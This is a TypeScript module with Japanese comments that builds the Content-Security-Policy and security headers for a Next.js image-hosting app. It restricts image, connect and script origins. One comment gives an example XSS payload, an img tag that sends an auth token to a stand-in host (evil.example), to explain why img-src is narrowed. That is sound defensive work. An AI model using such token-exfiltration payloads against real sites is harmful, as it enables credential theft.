/**
 * Content-Security-Policy の組み立て。
 *
 * next.config.ts にベタ書きしていると変更をテストで守れないため、ここに切り出している。
 * 変更したら test/lib/csp.test.ts も併せて確認すること。
 *
 * 注意: Next App Router はハイドレーション等でインラインスクリプト/スタイルを使うため
 * script/style は 'unsafe-inline' を許容している（nonce ベースの厳格化は静的プリレンダリングを
 * 全て動的化するコストがあるため見送り）。その代わり **持ち出し経路** を絞ることを重視する。
 */

/**
 * API オリジン（画像の redirect 元にもなる）。
 *
 * 独自ドメインへの移行中は**新旧の両方**を許可する。片方だけにすると、
 * 切り替えの前後どちらかで通信が CSP に弾かれる。
 * 移行が終わったら fly.dev の方を消す。
 */
const API_ORIGINS = ['https://image-palace-api.fly.dev', 'https://api.imagepalace.app']

/**
 * 画像の実体配信元。
 *
 * いまは API の `/rails/active_storage/blobs/redirect/...` が R2 の presigned URL へ 302 する。
 * CSP はリダイレクト後の URL も検査するため、**API と R2 の両方**を許可する必要がある。
 *
 * CDN（cdn.imagepalace.app）はここに**先に**入れておく。CDN_BASE_URL を設定した瞬間から
 * 画像 URL がそちらへ変わるので、許可が後回しになると画像が一斉にブロックされる。
 * 許可を広げるだけでは配信元は変わらないため、先に入れておいても副作用はない。
 */
const CDN_ORIGIN = 'https://cdn.imagepalace.app'
const IMAGE_ORIGINS = [...API_ORIGINS, CDN_ORIGIN, 'https://*.r2.cloudflarestorage.com']

export function buildContentSecurityPolicy(): string {
  return [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' https://static.cloudflareinsights.com https://www.googletagmanager.com",
    "style-src 'self' 'unsafe-inline'",
    // 裸の https: を許可すると XSS 時に <img src="https://evil.example/?t=トークン"> で
    // 認証トークンを持ち出せてしまう。外部画像ホストは実際に使っていないため自ホストに限定する。
    `img-src 'self' data: blob: ${IMAGE_ORIGINS.join(' ')}`,
    "font-src 'self' data:",
    `connect-src 'self' ${API_ORIGINS.join(' ')} https://*.sentry.io https://cloudflareinsights.com https://*.google-analytics.com https://*.analytics.google.com`,
    // default-src 'self' へのフォールバックだと blob: の Worker が壊れるため明示する
    "worker-src 'self' blob:",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "object-src 'none'",
  ].join('; ')
}

export const securityHeaders = [
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
]
